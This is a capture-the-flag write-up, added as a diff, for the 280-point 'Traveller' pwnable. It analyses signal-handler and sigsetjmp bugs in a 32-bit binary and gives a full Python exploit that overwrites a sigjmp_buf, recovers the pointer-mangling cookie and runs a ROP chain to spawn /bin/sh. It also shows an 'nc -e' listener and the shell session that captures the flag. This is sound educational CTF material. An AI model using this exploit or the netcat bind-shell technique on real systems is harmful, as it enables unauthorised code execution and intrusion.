@@ -1,0 +1,255 @@
+Traveller
+
+Pwnable (280 pts)
+You find an artifact that looks ancient, but yet looks like it's from the future... Upon further inspection, it looks like some sort of calculator, but it's calculation seems rather questionable. Maybe you can find who the owner of this is... 
+
+Problem is located in /home/traveller. SSH for access 52.6.29.61
+
+You can SSH to the (same) machine for env reasons. Your credentials are on your profile.
+
+
+After logging in, we look what we got:
+"""
+$ cd /home/traveller/
+$ ls -la
+total 64
+drwxr-xr-x    2 root      root       4096 Apr 20 03:24 .
+drwxr-xr-x 1505 root      root      36864 Apr 19 01:12 ..
+-r--r-----    1 traveller traveller    29 Apr 18 15:14 flag
+-rwxr-xr-x    1 root      traveller  5904 Apr 18 20:53 traveller
+-r-sr-xr-x    1 traveller root       7413 Apr 19 04:25 wrapper
+-rw-r--r--    1 root      root        237 Apr 19 04:25 wrapper.c
+$ cat wrapper.c 
+#include <unistd.h>
+
+int main(int argc, char **argv) {
+  uid_t euid = geteuid();
+  if (setresuid(euid, euid, euid) != 0) {
+    _exit(1);
+  }
+  char *nothing[] = { NULL };
+  return execve("/home/traveller/traveller", nothing, nothing);
+}
+
+"""
+
+Okay, the wrapper just calls the traveller binary, lets play around with the traveller binary:
+"""
+$ ./traveller 
+Welcome to the traveling calculator!
+Enter 3 numbers and get some really cool information about them!
+You notice some numbers together with the instructions: 2805971605
+Reading in val 0: 1
+Reading in val 1: 2
+Reading in val 2: 3
+1337/1 = 1337
+Sig calc result: 12324300/2x = 6162150
+1337/2 = 668
+Sig calc result: 12324300/2x = 3081075
+1337/3 = 445
+Sig calc result: 12324300/2x = 2054050
+
+$ ./traveller 
+Welcome to the traveling calculator!
+Enter 3 numbers and get some really cool information about them!
+You notice some numbers together with the instructions: 1173010421
+Reading in val 0: 0
+Reading in val 1: 0
+Reading in val 2: 0
+Divide by Zero Detected! Nice Try...
+Sig calc result: 12324300/2x = 6162150
+Divide by Zero Detected! Nice Try...
+Sig calc result: 12324300/2x = 6162150
+Divide by Zero Detected! Nice Try...
+Sig calc result: 12324300/2x = 6162150
+"""
+
+That does not look very interesting, after some playing, we find something interesting:
+"""
+$ ./traveller 
+Welcome to the traveling calculator!
+Enter 3 numbers and get some really cool information about them!
+You notice some numbers together with the instructions: 1431077602
+Reading in val 0: -2147483648
+Reading in val 1: -2147483648
+Reading in val 2: -2147483648
+1337/-2147483648 = 0
+Divide by Zero Detected! Nice Try...
+Divide by Zero Detected! Nice Try...
+[...]
+Divide by Zero Detected! Nice Try...
+Divide by Zero Detected! Nice Try...
+In SIGSEGV handler, 0x804d598
+Log a message for this failure:
+test
+buffer has:test
+Memory fault! Restarting program!
+Welcome to the traveling calculator!
+Enter 3 numbers and get some really cool information about them!
+You notice some numbers together with the instructions: 2894423490
+Reading in val 0:
+[...]
+"""
+
+So using INT_MIN as input values triggers some kind of bug and we are allowed to write a log message.
+After analyzing the traveller binary, we gather this information:
+- Three signal handlers are registered: SIGUSR1, SIGFPE and SIGSEGV
+- An alternative stack for the signal handlers is created
+- Two sigsetjmp/siglongjmp pairs exist:
+  - jmpbuf1: near the start of the main function is a sigsetjmp which is siglongjmp'ed by the SIGSEGV handler
+  - jmpbuf2: near the start of the loop over the input numbers is a sigsetjmp which is jumped to by the SIGFPE handler
+- The program flow is this:
+  - The signal handlers are registered
+  - The alternative stack control structure is initialized
+  - The first sigsetjmp buffer for the SIGSEGV signal is initialized
+  - A welcome message is printed
+  - The alternative signal stack is registered
+  - The 3 numbers are read
+  - The 3 numbers are processed, the loop does this:
+    - If the input number position is 3, the loop is quit
+    - The second sigsetjmp buffer for the SIGFPE signal is initialized
+    - 1337 / <number> is printed
+    - the SIGUSR1 signal is triggered
+    - The handler does the following:
+      - increments the input number position
+      - prints 12324300 / (2 * <number>)
+
+The interesting parts of the bss segment:
+"""
+.bss:0804A220 ; sigjmp_buf jmpbuf1
+.bss:0804A220 jmpbuf1         __jmp_buf_tag <?>
+.bss:0804A2BC ; sigjmp_buf jmpbuf2
+.bss:0804A2BC jmpbuf2         __jmp_buf_tag <?>
+.bss:0804A358 ; struct stack_t altstack_control_struct
+.bss:0804A358 altstack_control_struct stack_t <?>
+.bss:0804A364 altstack        db 4000h dup(?)
+"""
+
+The INT_MIN input value triggers the following:
+- the first calculation is successfull
+- SIGUSR1 is thrown
+- * the input number position is incremented by the SIGUSR1 handler
+- the second calculation within the SIGUSR1 handler throws a SIGFPE
+- the SIGFPE handler jumps to it's sigsetjmp position
+- the "Divide by Zero Detected!" message is printed
+- SIGUSR1 is thrown again (continue at *)
+
+There are some problems that result in the SIGSEGV being thrown after a while:
+- the sigsetjmp position of the SIGFPE handler is after the check for the input number position being 3
+- the SIGUSR1 handler increments the input number position before making the SIGFPE throwing calculation
+- the input numbers are at the end of the BSS segment, only followed by zeros
+- both zero and INT_MIN trigger the SIGFPE signal within the SIGUSR1 handler
+
+The result of all this is, that we are now within the SIGSEGV handler which does the following:
+- Prints some infos
+- Asks for a log message (written to a stack buffer)
+- Copies the log message to another buffer on the stack which is very big (~0x2e22 bytes)
+- Returns to the main function with siglongjmp
+
+The bigger buffer on the stack is too big for our alternative stack, the beginning of the message is copied over the last 4 bytes of the jmpbuf2 and can completely overwrite the altstack_control_struct.
+With this we were unable to directly gain control over the application but by modifying the altstack_control_struct to have a slightly smaller start position, in the next run, we can overwrite the jmpbuf1 which allows us to have complete control over the registers "recovered" by the SIGSEGV siglongjmp.
+One last problem exists: the saved ESP and EIP values within the sigjmp_buf are obfuscated with a secret cookie but the weird number given in the welcome message is such an obfuscated EIP value for a known address, we can use that to calculate the cookie.
+
+Exploit:
+"""
+#!/usr/bin/env python2
+
+import socket
+import struct
+import telnetlib
+
+HOST = "localhost"
+PORT = 4545
+
+s = socket.socket()
+s.connect((HOST, PORT))
+
+def ru(s, a):
+        d = ""
+
+        while not d.endswith(a):
+                c = s.recv(4096)
+                d += c
+                assert(c)
+                #print `d`
+
+        return d
+
+def ror(v, n):
+        ret = (v >> n) | (v << (32-n))
+        return ret & 0xFFFFFFFF
+
+
+PAYLOAD_STACKCTRL = "A"*6 + "\x34\xA2"
+
+scrambled_eip = int(ru(s, "Reading in val 0: ").split("\n")[-2].split(" ")[-1])
+magic_spacecookie = ror(scrambled_eip, 9) ^ 0x8048A47
+print "Cookie: ", hex(magic_spacecookie)
+s.sendall("-2147483648\n")
+
+ru(s, "Reading in val 1: ")
+s.sendall("-2147483648\n")
+
+ru(s, "Reading in val 2: ")
+s.sendall("-2147483648\n")
+
+ru(s, "Log a message for this failure:\n")
+s.sendall(PAYLOAD_STACKCTRL+"\n")
+
+
+#EBX ESI EDI EBP ESP EIP
+
+WANTED_EIP = 0x804906a
+WANTED_ESP = 0x804a238
+
+GETPID_GOT = 0x0804A180
+chain = [0x08048568, 0xFFFFF5C0, (GETPID_GOT-0x5D5B04C4) & 0xFFFFFFFF, WANTED_ESP+8*4, 0x08048783, 0x08048568, GETPID_GOT, 0x42424242, 0x41414141, 0x08048EEF]
+chain += [WANTED_ESP + len(chain)*4 + 4*3, WANTED_ESP + len(chain)*4 + 4*3 + 10, WANTED_ESP + len(chain)*4 + 4*3 + 10]
+
+ROPCHAIN = struct.pack("<IIIIIIIIIIIII", *chain)
+ROPCHAIN += "/bin/sh"
+
+EBX = 0x42424242
+ESI = 0x43434343
+EDI = 0x44444444
+EBP = WANTED_ESP + 3*4
+registers = struct.pack("<IIIIII", *([EBX] + [ESI] + [EDI] + [EBP] + [ror((WANTED_ESP^magic_spacecookie), 32-9)] + [ror((WANTED_EIP^magic_spacecookie), 32-9)]))
+PAYLOAD_LONGJUMP = "A"*14 + registers + ROPCHAIN
+
+ru(s, "Reading in val 0: ")
+s.sendall("-2147483648\n")
+
+ru(s, "Reading in val 1: ")
+s.sendall("-2147483648\n")
+
+ru(s, "Reading in val 2: ")
+s.sendall("-2147483648\n")
+
+ru(s, "Log a message for this failure:\n")
+
+s.sendall(PAYLOAD_LONGJUMP+"\n")
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+"""
+
+We exploited this through an ssh port forwarding and nc -e:
+"""
+$ ssh teamXXX@52.6.29.61 -L 4545:127.0.0.1:4545
+$ cd /home/traveller/
+$ nc -l -p 4545 -e ./wrapper
+
+$ ./sploit.py 
+Cookie:  0xb822ed3b
+buffer has:AAAAAAAAAAAAAABBBBCCCCDDDDD`�L`��Lh������X�h�BBBBAAAAlvv/bin/sh
+id
+uid=1002(traveller) gid=1737(team735) groups=1737(team735),2503(ctf)
+cat flag*
+flag{tim3Tr@veL_Al2ways_fOn}
+exit
+*** Connection closed by remote host ***
+"""
+
++=280
+---spq
